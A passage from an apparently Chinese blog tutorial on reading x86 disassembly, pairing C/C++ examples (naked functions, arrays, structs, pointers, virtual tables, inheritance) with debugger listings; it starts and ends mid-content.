不是单个指令，它只是描述了跳转之前检查条件代码的跳转助记符</p>\n<p>例如 JNE，在跳转之前检查条件代码</p>\n<p>典型的情况是进行比较 (设置 CC)，然后使用跳转助记符之一</p>\n<p>CMP EAX,0</p>\n<p>JNE XXXXX</p>\n<p>条件代码也可以用 AND、OR、XOR、加法、减法 (当然也可以是 CMP) 等指令来设置</p>\n<p>JCC 指令用于改变 EIP（CPU 要读取的指令地址）</p>\n<h4 id=\"jmp指令\"><a class=\"markdownIt-Anchor\" href=\"#jmp指令\">#</a> JMP 指令</h4>\n<p>JMP 指令：修改 EIP 的值</p>\n<p>JMP 指令只影响了 EIP，不影响堆栈和其它通用寄存器</p>\n<p>JMP 寄存器 / 立即数 相当于 MOV EIP, 寄存器 / 立即数</p>\n<h3 id=\"空函数-裸函数\"><a class=\"markdownIt-Anchor\" href=\"#空函数-裸函数\">#</a> 空函数 / 裸函数</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &quot;windows.h&quot;</span><br><span class=\"line\">#include &quot;stdio.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">int __declspec (naked) Puls()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm&#123;</span><br><span class=\"line\">\t\tpushad</span><br><span class=\"line\">\t\tpushfd</span><br><span class=\"line\">\t\tmov     eax,0</span><br><span class=\"line\">\t\tmov     edx,3</span><br><span class=\"line\">\t\tadd     eax,edx</span><br><span class=\"line\">\t\tpopfd</span><br><span class=\"line\">\t\tpopad</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPuls();</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00292240 &gt; &gt; \\60            pushad</span><br><span class=\"line\">00292241   .  9C            pushfd</span><br><span class=\"line\">00292242   .  B8 00000000   mov     eax,0x0</span><br><span class=\"line\">00292247   .  BA 03000000   mov     edx,0x3</span><br><span class=\"line\">0029224C   .  03C2          add     eax,edx</span><br><span class=\"line\">0029224E   .  9D            popfd</span><br><span class=\"line\">0029224F   .  61            popad</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//空函数        </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//调用空函数</span></span><br><span class=\"line\">        <span class=\"built_in\">function</span>();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00E92480</span> &gt;/&gt; \\<span class=\"number\">55</span>            push    ebp</span><br><span class=\"line\"><span class=\"number\">00E92481</span>  |.  <span class=\"number\">8B</span>EC          mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">00E92483</span>  |.  <span class=\"number\">81</span>EC C0000000 sub     esp,<span class=\"number\">0xC0</span></span><br><span class=\"line\"><span class=\"number\">00E92489</span>  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">00E9248</span>A  |.  <span class=\"number\">56</span>            push    esi</span><br><span class=\"line\"><span class=\"number\">00E9248</span>B  |.  <span class=\"number\">57</span>            push    edi</span><br><span class=\"line\"><span class=\"number\">00E9248</span>C  |.  <span class=\"number\">8</span>DBD <span class=\"number\">40F</span>FFFFF lea     edi,[local<span class=\"number\">.48</span>]</span><br><span class=\"line\"><span class=\"number\">00E92492</span>  |.  B9 <span class=\"number\">30000000</span>   mov     ecx,<span class=\"number\">0x30</span></span><br><span class=\"line\"><span class=\"number\">00E92497</span>  |.  B8 CCCCCCCC   mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">00E9249</span>C  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">00E9249</span>E  |.  <span class=\"number\">5F</span>            pop     edi</span><br><span class=\"line\"><span class=\"number\">00E9249</span>F  |.  <span class=\"number\">5</span>E            pop     esi</span><br><span class=\"line\"><span class=\"number\">00E924</span>A0  |.  <span class=\"number\">5B</span>            pop     ebx</span><br><span class=\"line\"><span class=\"number\">00E924</span>A1  |.  <span class=\"number\">8B</span>E5          mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">00E924</span>A3  |.  <span class=\"number\">5</span>D            pop     ebp</span><br><span class=\"line\"><span class=\"number\">00E924</span>A4  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"c-程序入口\"><a class=\"markdownIt-Anchor\" href=\"#c-程序入口\">#</a> C 程序入口</h3>\n<ol>\n<li>mainCRTStartup 和 wmainCRTStartup 是控制台环境下多字节编码和 Unicode 编码的启动函数</li>\n<li>而 WinMainCRTStartup 和 wWinMainCRTStartup 是 windows 环境下多字节编码和 Unicode 编码的启动函数</li>\n</ol>\n<p>mainCRTStartup 做了哪些事：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/d7e8c05ca5a843948525ddcbf6db07b9.png\" alt=\"img\"></p>\n<p>根据 main 函数的三个参数找入口，main 的函数原型如下：</p>\n<p><code>int main(int argc,char *argv[],char *envp[])&#123;&#125;</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/eacff80fa91044e28df8e670e9ed1e35.png\" alt=\"img\"></p>\n<p>vs2008 debug 找 main 入口</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916205213461.png\" alt=\"image-20230916205213461\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916205230417.png\" alt=\"image-20230916205230417\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916205252590.png\" alt=\"image-20230916205252590\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230916205313967.png\" alt=\"image-20230916205313967\"></p>\n<h3 id=\"全局变量和局部变量\"><a class=\"markdownIt-Anchor\" href=\"#全局变量和局部变量\">#</a> 全局变量和局部变量</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/414b76cc64ff4c4292c015b238247f76.png\" alt=\"img\"></p>\n<h4 id=\"全局变量\"><a class=\"markdownIt-Anchor\" href=\"#全局变量\">#</a> 全局变量</h4>\n<ol>\n<li>\n<p><code>MOV 寄存器,byte/word/dword ptr ds:[0x12345678]</code></p>\n</li>\n<li>\n<p>上面的 0x12345678 是固定的地址，每次程序启动都不变</p>\n<p>通过寄存器的宽度，或者 byte/word/dword 来判断全局变量的宽度</p>\n</li>\n<li>\n<p>全局变量就是所谓的基址</p>\n</li>\n</ol>\n<h4 id=\"局部变量\"><a class=\"markdownIt-Anchor\" href=\"#局部变量\">#</a> 局部变量</h4>\n<ol>\n<li>\n<p>局部变量在程序编译完成后并没有分配固定的地址</p>\n</li>\n<li>\n<p>在所属的方法没有被调用时，局部变量并不会分配内存地址，只有当所属的程序被调用了，才会在堆栈中分配内存</p>\n</li>\n<li>\n<p>当局部变量所属的方法执行完毕后，局部变量所占用的内存将变成垃圾数据。局部变量消失</p>\n</li>\n<li>\n<p>局部变量只能在函数内部使用，函数 A 无法使用函数 B 的局部变量</p>\n</li>\n<li>\n<p>局部变量的反汇编识别</p>\n<p>[ebp-4]</p>\n<p>[ebp-8]</p>\n<p>[ebp-0xC]</p>\n</li>\n</ol>\n<h3 id=\"类型转换\"><a class=\"markdownIt-Anchor\" href=\"#类型转换\">#</a> 类型转换</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOVSX</span><br><span class=\"line\">先符号扩展,再传送</span><br><span class=\"line\">MOV AL,0FF</span><br><span class=\"line\">MOVSX CX,AL</span><br><span class=\"line\">MOV AL,80</span><br><span class=\"line\">MOVSX CX,AL</span><br><span class=\"line\"></span><br><span class=\"line\">MOVZX</span><br><span class=\"line\">先零扩展,再传送</span><br><span class=\"line\">MOV AL,0FF</span><br><span class=\"line\">MOVZX CX,AL</span><br><span class=\"line\">MOV AL,80</span><br><span class=\"line\">MOVSX CX,AL</span><br></pre></td></tr></table></figure>\n<h3 id=\"数组\"><a class=\"markdownIt-Anchor\" href=\"#数组\">#</a> 数组</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int arr[5]=&#123;1,2,3,4,5&#125;;</span><br><span class=\"line\">0040D71D    C745 E0 01000000      mov     dword ptr ss:[ebp-0x20],0x1</span><br><span class=\"line\">0040D724    C745 E4 02000000      mov     dword ptr ss:[ebp-0x1C],0x2</span><br><span class=\"line\">0040D72B    C745 E8 03000000      mov     dword ptr ss:[ebp-0x18],0x3</span><br><span class=\"line\">0040D732    C745 EC 04000000      mov     dword ptr ss:[ebp-0x14],0x4</span><br><span class=\"line\">0040D739    C745 F0 05000000      mov     dword ptr ss:[ebp-0x10],0x5</span><br><span class=\"line\"></span><br><span class=\"line\">0040D756    8B4C85 E0             mov     ecx,dword ptr ss:[ebp+eax*4-0x20]</span><br><span class=\"line\">取下标的方式，eax=1 时，取的是 0x2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int arr[3][4]=&#123;</span><br><span class=\"line\">    &#123;1,2,3,4&#125;,</span><br><span class=\"line\">    &#123;5,6,7,8&#125;,</span><br><span class=\"line\">    &#123;9,10,11,12&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">0040D7CE    C745 D0 01000000      mov     dword ptr ss:[ebp-0x30],0x1</span><br><span class=\"line\">0040D7D5    C745 D4 02000000      mov     dword ptr ss:[ebp-0x2C],0x2</span><br><span class=\"line\">0040D7DC    C745 D8 03000000      mov     dword ptr ss:[ebp-0x28],0x3</span><br><span class=\"line\">0040D7E3    C745 DC 04000000      mov     dword ptr ss:[ebp-0x24],0x4</span><br><span class=\"line\">0040D7EA    C745 E0 05000000      mov     dword ptr ss:[ebp-0x20],0x5</span><br><span class=\"line\">0040D7F1    C745 E4 06000000      mov     dword ptr ss:[ebp-0x1C],0x6</span><br><span class=\"line\">0040D7F8    C745 E8 07000000      mov     dword ptr ss:[ebp-0x18],0x7</span><br><span class=\"line\">0040D7FF    C745 EC 08000000      mov     dword ptr ss:[ebp-0x14],0x8</span><br><span class=\"line\">0040D806    C745 F0 09000000      mov     dword ptr ss:[ebp-0x10],0x9</span><br><span class=\"line\">0040D80D    C745 F4 0A000000      mov     dword ptr ss:[ebp-0xC],0xA</span><br><span class=\"line\">0040D814    C745 F8 0B000000      mov     dword ptr ss:[ebp-0x8],0xB</span><br><span class=\"line\">0040D81B    C745 FC 0C000000      mov     dword ptr ss:[ebp-0x4],0xC</span><br><span class=\"line\"></span><br><span class=\"line\">0040D828    C745 C8 01000000      mov     dword ptr ss:[ebp-0x38],0x1</span><br><span class=\"line\">0040D82F    C745 C4 02000000      mov     dword ptr ss:[ebp-0x3C],0x2</span><br><span class=\"line\">0040D836    8B4D C8               mov     ecx,dword ptr ss:[ebp-0x38]</span><br><span class=\"line\">0040D839    C1E1 04               shl     ecx,0x4</span><br><span class=\"line\">0040D83C    8D540D D0             lea     edx,dword ptr ss:[ebp+ecx-0x30]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"结构体\"><a class=\"markdownIt-Anchor\" href=\"#结构体\">#</a> 结构体</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">struct Player&#123;</span><br><span class=\"line\">    float hp;                //人物血量</span><br><span class=\"line\">    float mp;                //人物魔力值</span><br><span class=\"line\">    int money;                //人物金钱</span><br><span class=\"line\">    int atk;                //人物攻击力</span><br><span class=\"line\">    char name[10];        //人物昵称</span><br><span class=\"line\">    float x;                //人物x坐标</span><br><span class=\"line\">    float y;                //人物y坐标</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tPlayer player;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tplayer.hp=100;</span><br><span class=\"line\">\tplayer.mp=50;</span><br><span class=\"line\">\tplayer.money=1000;</span><br><span class=\"line\">\tplayer.atk=10;        </span><br><span class=\"line\">\tstrcpy(player.name,&quot;lyl610abc&quot;);</span><br><span class=\"line\">\tplayer.x=600;</span><br><span class=\"line\">\tplayer.y=100;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">00401028    C745 DC 0000C842      mov     dword ptr ss:[ebp-0x24],0x42C80000</span><br><span class=\"line\">0040102F    C745 E0 00004842      mov     dword ptr ss:[ebp-0x20],0x42480000</span><br><span class=\"line\">00401036    C745 E4 E8030000      mov     dword ptr ss:[ebp-0x1C],0x3E8</span><br><span class=\"line\">0040103D    C745 E8 0A000000      mov     dword ptr ss:[ebp-0x18],0xA</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"内存对齐\"><a class=\"markdownIt-Anchor\" href=\"#内存对齐\">#</a> 内存对齐</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内存对齐</span><br><span class=\"line\">内存对齐也称作字节对齐</span><br><span class=\"line\">前面或多或少都有提到过内存对齐，但没有具体展开，现在来谈谈内存对齐</span><br><span class=\"line\">为什么要内存对齐</span><br><span class=\"line\">性能原因</span><br><span class=\"line\">寻址时提高效率，采用了以空间换时间的思想</span><br><span class=\"line\">当寻址的内存的单位和本机宽度一致时，寻址的效率最高</span><br><span class=\"line\">举个例子：</span><br><span class=\"line\"></span><br><span class=\"line\">在32位的机器上，一次读32位（4字节）的内存 效率最高</span><br><span class=\"line\">在64位的机器上，一次读64位（8字节）的内存 效率最高</span><br></pre></td></tr></table></figure>\n<h3 id=\"指针\"><a class=\"markdownIt-Anchor\" href=\"#指针\">#</a> 指针</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void function()&#123;                </span><br><span class=\"line\">    char* a;</span><br><span class=\"line\">    a=(char*) 610;</span><br><span class=\"line\">    int** b;</span><br><span class=\"line\">    b=(int**) 610;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">00401028    C745 FC 62020000      mov     dword ptr ss:[ebp-0x4],0x262</span><br><span class=\"line\">0040102F    C745 F8 62020000      mov     dword ptr ss:[ebp-0x8],0x262</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"c\"><a class=\"markdownIt-Anchor\" href=\"#c\">#</a> C++</h2>\n<h3 id=\"虚表指针\"><a class=\"markdownIt-Anchor\" href=\"#虚表指针\">#</a> 虚表指针</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/62c52b62bffc438695370d0b5e1e70f6.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/6fcf58bc7a2a45cdae89fe8d0f28c5d0.jpg\" alt=\"img\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;windows.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdio.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">base_class</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">private</span>:</span><br><span class=\"line\">\t<span class=\"type\">int</span> m_base;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">void</span> <span class=\"title\">v_func1</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;This is base_class&#x27;s v_func1()&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">void</span> <span class=\"title\">v_func2</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;This is base_class&#x27;s v_func2()&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">virtual</span> <span class=\"type\">void</span> <span class=\"title\">v_func3</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">\t</span>&#123;</span><br><span class=\"line\">\t\tcout &lt;&lt; <span class=\"string\">&quot;This is base_class&#x27;s v_func3()&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tbase_class bc;</span><br><span class=\"line\">\tbc.<span class=\"built_in\">v_func1</span>();</span><br><span class=\"line\">\tbc.<span class=\"built_in\">v_func2</span>();</span><br><span class=\"line\">\tbc.<span class=\"built_in\">v_func3</span>();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>lea     ecx,dword ptr ss:[ebp-0x8]   此时 ecx 保存的是 this 指针</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917151414247.png\" alt=\"image-20230917151414247\"></p>\n<p>此时 [eax] 中的值就是虚表指针的首地址，就是上图的__vfptr，其实这个地址也是一个全局变量，或者说基址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917151703299.png\" alt=\"image-20230917151703299\"></p>\n<p>跟入 [eax]，里面就是每个虚函数的指针，其实就是 [__vfptr]</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917152129266.png\" alt=\"image-20230917152129266\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917152038205.png\" alt=\"image-20230917152038205\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917151829721.png\" alt=\"image-20230917151829721\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917153047111.png\" alt=\"image-20230917153047111\"></p>\n<h3 id=\"继承\"><a class=\"markdownIt-Anchor\" href=\"#继承\">#</a> 继承</h3>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">employee</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"built_in\">employee</span>() &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;employee()!\\n&quot;</span>);&#125;</span><br><span class=\"line\">\t~<span class=\"built_in\">employee</span>() &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;~employee()!\\n&quot;</span>);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">manager</span> : <span class=\"keyword\">public</span> employee</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"keyword\">public</span>:</span><br><span class=\"line\">\t<span class=\"built_in\">manager</span>() &#123; <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;manager()!\\n&quot;</span>);&#125;</span><br><span class=\"line\">\t~<span class=\"built_in\">manager</span>() &#123;  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;~maneger()!\\n&quot;</span>);&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tmanager my;</span><br><span class=\"line\">\t<span class=\"built_in\">getchar</span>();</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>call 01331113 调用了 manager 类，跟入</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917155627489.png\" alt=\"image-20230917155627489\"></p>\n<p>由于 manger 类是继承的 employee 类，因此 manger 类中会调用 employee 类，即 call 013310A0</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917155735578.png\" alt=\"image-20230917155735578\"></p>\n<p>mov ecx,dword ptr ss:[ebp-8] 就是 this 指针。由于没有调用函数，此时指向的值为 CC</p>\n<h3 id=\"this\"><a class=\"markdownIt-Anchor\" href=\"#this\">#</a> this</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span 